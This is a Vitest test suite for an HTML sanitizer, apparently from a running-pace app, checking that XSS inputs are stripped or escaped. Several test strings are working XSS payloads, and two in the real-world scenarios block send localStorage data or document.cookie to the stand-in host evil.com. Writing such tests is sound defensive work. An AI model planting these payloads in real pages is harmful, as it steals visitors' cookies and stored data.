import { describe, it, expect } from 'vitest';
import { sanitizeHTML, sanitizeText, stripHTML, escapeHTML } from '../../src/sanitizer.js';

describe('sanitizer - XSS Prevention', () => {
	describe('sanitizeHTML()', () => {
		it('should allow safe HTML tags', () => {
			const input = '<b>Bold</b> and <i>Italic</i> text';
			const result = sanitizeHTML(input);
			expect(result).toContain('<b>Bold</b>');
			expect(result).toContain('<i>Italic</i>');
		});

		it('should remove script tags', () => {
			const input = '<script>alert("XSS")</script>';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('alert');
		});

		it('should remove img tags with onerror', () => {
			const input = '<img src=x onerror="alert(\'XSS\')">';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('onerror');
			expect(result).not.toContain('alert');
		});

		it('should remove javascript: protocol URLs', () => {
			const input = '<a href="javascript:alert(\'XSS\')">Click</a>';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('javascript:');
		});

		it('should remove on* event handlers', () => {
			const input = '<div onclick="alert(\'XSS\')">Click</div>';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('onclick');
			expect(result).not.toContain('alert');
		});

		it('should handle iframe injection', () => {
			const input = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('<iframe');
			expect(result).not.toContain('javascript:');
		});

		it('should handle SVG XSS attempts', () => {
			const input = '<svg onload="alert(\'XSS\')"></svg>';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('onload');
			expect(result).not.toContain('alert');
		});

		it('should handle object/embed tags', () => {
			const input = '<object data="javascript:alert(\'XSS\')"></object>';
			const result = sanitizeHTML(input);
			expect(result).not.toContain('<object');
			expect(result).not.toContain('javascript:');
		});
	});

	describe('sanitizeText()', () => {
		it('should escape HTML entities', () => {
			const input = '<script>alert("XSS")</script>';
			const result = sanitizeText(input);
			expect(result).toBe('&lt;script&gt;alert("XSS")&lt;/script&gt;');
		});

		it('should handle plain text without changes', () => {
			const input = 'Hello World';
			const result = sanitizeText(input);
			expect(result).toBe('Hello World');
		});

		it('should handle empty string', () => {
			const result = sanitizeText('');
			expect(result).toBe('');
		});

		it('should handle null/undefined', () => {
			expect(sanitizeText(null)).toBe('');
			expect(sanitizeText(undefined)).toBe('');
		});
	});

	describe('stripHTML()', () => {
		it('should remove all HTML tags', () => {
			const input = '<b>Bold</b> and <i>Italic</i>';
			const result = stripHTML(input);
			expect(result).toBe('Bold and Italic');
		});

		it('should remove script tags and content', () => {
			const input = 'Safe <script>alert("XSS")</script> text';
			const result = stripHTML(input);
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('alert');
		});

		it('should handle PR notes with malicious content', () => {
			const input = 'Great race! <img src=x onerror="steal_data()">';
			const result = stripHTML(input);
			expect(result).toBe('Great race! ');
			expect(result).not.toContain('img');
			expect(result).not.toContain('onerror');
		});

		it('should handle complex nested HTML', () => {
			const input = '<div><span>Text</span><script>alert(1)</script></div>';
			const result = stripHTML(input);
			expect(result).toBe('Text');
		});

		it('should handle empty input', () => {
			expect(stripHTML('')).toBe('');
			expect(stripHTML(null)).toBe('');
			expect(stripHTML(undefined)).toBe('');
		});
	});

	describe('escapeHTML()', () => {
		it('should escape all dangerous characters', () => {
			const input = '<script>alert("XSS")</script>';
			const result = escapeHTML(input);
			expect(result).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
		});

		it('should escape ampersands', () => {
			const input = 'A & B';
			const result = escapeHTML(input);
			expect(result).toBe('A &amp; B');
		});

		it('should escape quotes', () => {
			const input = 'He said "Hello"';
			const result = escapeHTML(input);
			expect(result).toBe('He said &quot;Hello&quot;');
		});

		it('should escape single quotes', () => {
			const input = "It's working";
			const result = escapeHTML(input);
			expect(result).toBe('It&#039;s working');
		});

		it('should handle multiple special characters', () => {
			const input = '< > & " \'';
			const result = escapeHTML(input);
			expect(result).toBe('&lt; &gt; &amp; &quot; &#039;');
		});

		it('should handle empty input', () => {
			expect(escapeHTML('')).toBe('');
			expect(escapeHTML(null)).toBe('');
			expect(escapeHTML(undefined)).toBe('');
		});
	});

	describe('Real-world XSS attack scenarios', () => {
		it('should prevent PR note XSS via script injection', () => {
			const maliciousNote = 'Best time ever! <script>fetch("https://evil.com?data="+localStorage.getItem("pace-calc-prs"))</script>';
			const result = stripHTML(maliciousNote);
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('fetch');
			expect(result).toBe('Best time ever! ');
		});

		it('should prevent PR note XSS via img onerror', () => {
			const maliciousNote = 'PR achieved! <img src=x onerror="document.location=\'https://evil.com?c=\'+document.cookie">';
			const result = stripHTML(maliciousNote);
			expect(result).not.toContain('img');
			expect(result).not.toContain('onerror');
			expect(result).not.toContain('document');
		});

		it('should prevent PR note XSS via style tag', () => {
			const maliciousNote = '<style>body{display:none}</style>Good race!';
			const result = stripHTML(maliciousNote);
			expect(result).not.toContain('<style>');
			expect(result).toContain('Good race!');
		});

		it('should prevent data exfiltration via SVG', () => {
			const maliciousNote = '<svg/onload=alert(localStorage.getItem("pace-calc-prs"))>';
			const result = stripHTML(maliciousNote);
			expect(result).not.toContain('svg');
			expect(result).not.toContain('onload');
			expect(result).not.toContain('alert');
		});

		it('should handle encoded script tags', () => {
			const maliciousNote = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
			const result = stripHTML(maliciousNote);
			// Encoded entities are already safe, they display as text
			expect(result).toContain('&lt;script&gt;');
			expect(result).not.toContain('<script>');
		});

		it('should prevent HTML injection in display names', () => {
			const maliciousDisplayName = 'Marathon <script>alert(1)</script> PR';
			const result = escapeHTML(maliciousDisplayName);
			expect(result).toContain('&lt;script&gt;');
			expect(result).not.toContain('<script>');
		});

		it('should sanitize result values that might contain HTML', () => {
			const maliciousValue = '5:30 /km <img src=x onerror=alert(1)>';
			const result = sanitizeHTML(maliciousValue);
			expect(result).not.toContain('onerror');
			expect(result).not.toContain('alert');
		});
	});

	describe('Performance and edge cases', () => {
		it('should handle very long strings', () => {
			const longString = 'A'.repeat(10000) + '<script>alert(1)</script>';
			const result = stripHTML(longString);
			expect(result).not.toContain('<script>');
			expect(result.length).toBeGreaterThan(9000);
		});

		it('should handle deeply nested HTML', () => {
			let nested = 'content';
			for (let i = 0; i < 100; i++) {
				nested = `<div>${nested}</div>`;
			}
			const result = stripHTML(nested);
			expect(result).toBe('content');
		});

		it('should handle special unicode characters', () => {
			const input = '🏃‍♂️ Great run! 💪 <script>alert(1)</script>';
			const result = stripHTML(input);
			expect(result).toContain('🏃‍♂️');
			expect(result).toContain('💪');
			expect(result).not.toContain('<script>');
		});

		it('should handle CRLF injection attempts', () => {
			const input = 'Text\r\n<script>alert(1)</script>';
			const result = stripHTML(input);
			expect(result).not.toContain('<script>');
		});

		it('should handle null byte injection', () => {
			const input = 'Text\x00<script>alert(1)</script>';
			const result = stripHTML(input);
			expect(result).not.toContain('<script>');
		});
	});
});
